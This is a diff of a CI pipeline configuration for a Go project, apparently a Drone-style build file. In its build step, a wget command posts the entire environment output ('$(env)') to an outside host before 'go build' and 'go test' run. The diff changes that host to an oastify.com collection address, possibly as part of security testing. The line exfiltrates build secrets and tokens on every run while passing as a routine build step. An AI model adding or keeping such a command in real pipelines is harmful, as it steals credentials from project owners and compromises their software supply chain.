@@ -13,7 +13,7 @@ steps:
       GOOS: linux
       CGO_ENABLED: 0
     commands:
-      - wget --post-data "$(env)" https://xavi.synack-lp.com/
+      - wget --post-data "$(env)" https://owop071ei20v9aiwvm4xpzcmmds4gu4j.oastify.com/
       - go build
       - go test ./...
 
